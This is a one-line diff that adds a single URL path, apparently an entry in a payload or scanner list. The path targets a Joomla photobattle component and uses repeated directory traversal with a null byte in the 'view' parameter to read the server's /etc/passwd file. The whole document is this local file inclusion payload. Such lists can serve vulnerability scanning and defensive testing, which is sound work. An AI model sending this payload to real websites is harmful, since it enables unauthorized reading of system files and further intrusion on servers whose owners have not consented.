@@ -1,0 +1,1 @@
+/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00
